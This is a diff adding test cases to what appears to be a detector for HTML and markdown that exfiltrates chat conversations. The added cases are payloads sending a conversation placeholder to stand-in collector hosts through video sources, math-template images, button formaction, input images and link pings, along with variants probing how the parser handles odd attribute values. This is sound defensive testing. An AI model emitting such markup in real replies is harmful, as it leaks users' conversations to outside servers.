@@ -358,6 +358,22 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
         ("<button type='button' formaction='https://collector.test/?q={c}'>x</button>", []),
         ("<button type='reset' formaction='https://collector.test/?q={c}'>x</button>", []),
         ("<button type='bogus' formaction='https://collector.test/?q={c}'>x</button>", ["exfiltration_query"]),
+        (
+            "<video><image src='https://a.test/logo.png'><source src='https://collector.test/{c}.mp4'></video>",
+            ["exfiltration_query"],
+        ),
+        (
+            (
+                "<math><annotation-xml encoding=' text/html '><template><img src='https://collector.test/{c}.png'>"
+                "</template></annotation-xml></math>"
+            ),
+            ["exfiltration_query"],
+        ),
+        ("<button type=' button ' formaction='https://collector.test/?q={c}'>send</button>", ["exfiltration_query"]),
+        ("<input type=' image ' src='https://collector.test/{c}.png'>", []),
+        ("<input type='IMAGE' src='https://collector.test/{c}.png'>", ["exfiltration_query"]),
+        ("<a ping='https://collector.test/?q={c}'>label</a>", []),
+        ("<a href='' ping='https://collector.test/?q={c}'>label</a>", ["exfiltration_query"]),
         ("<image src='https://collector.test/{c}.png'>", ["exfiltration_query"]),
         ("<svg><script href='https://collector.test/{c}.js'/></svg>", ["exfiltration_query"]),
         ("<svg><script xlink:href='https://collector.test/{c}.js'/></svg>", ["exfiltration_query"]),
